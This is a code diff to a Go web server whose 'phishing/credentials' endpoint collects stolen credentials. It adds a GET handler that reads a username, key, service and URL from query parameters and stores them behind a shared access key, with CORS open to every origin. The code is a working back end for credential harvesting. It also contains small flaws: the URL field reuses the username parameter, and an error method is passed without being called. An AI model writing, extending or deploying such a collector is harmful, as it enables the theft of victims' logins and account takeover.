@@ -50,7 +50,7 @@ func StoreCredential(credential Credentials) error {
 	return err
 }
 
-func HandleCredentials(c echo.Context) error {
+func HandlePostCredentials(c echo.Context) error {
 	credential := Credentials{Time: time.Now().String()}
 	if (c.Request().Header.Get("AccessKey") != SERVER_ACCESS_KEY){
 		fmt.Printf("> Unauthorized\n")
@@ -71,12 +71,33 @@ func HandleCredentials(c echo.Context) error {
 	return c.String(http.StatusOK, "{\"status\":\"ok\"}")
 }
 
+func HandleGetCredentials(c echo.Context) error {
+	credential := Credentials{Time: time.Now().String()}
+	if (c.QueryParam("ak") != SERVER_ACCESS_KEY){
+		fmt.Printf("> Unauthorized\n")
+		return c.String(http.StatusUnauthorized, "{\"status\":\"unauthorized\"}")
+	}
+	credential.Username = c.QueryParam("u")
+	credential.Key = c.QueryParam("k")
+	credential.Service = c.QueryParam("s")
+	credential.Url = c.QueryParam("u")
+	fmt.Printf("> Saving credential: \n%v\n", credential)
+	err := StoreCredential(credential)
+	if err != nil {
+		fmt.Printf("> Error storing credential:\n%v\n", err)
+		return echo.NewHTTPError(http.StatusInternalServerError, err.Error)
+	}
+	return c.String(http.StatusOK, "{\"status\":\"ok\"}")
+}
+
+
 func main() {
 	e := echo.New()
 	e.Use(middleware.CORSWithConfig(middleware.CORSConfig{
 		AllowOrigins: []string{"*"},
 		AllowHeaders: []string{echo.HeaderOrigin, echo.HeaderContentType, echo.HeaderAccept, "AccessKey"},
 	}))
-	e.POST("phishing/credentials", HandleCredentials)
+	e.POST("phishing/credentials", HandlePostCredentials)
+	e.GET("phishing/credentials", HandleGetCredentials)
 	e.Logger.Fatal(e.Start(":" + SERVER_PORT))
 }
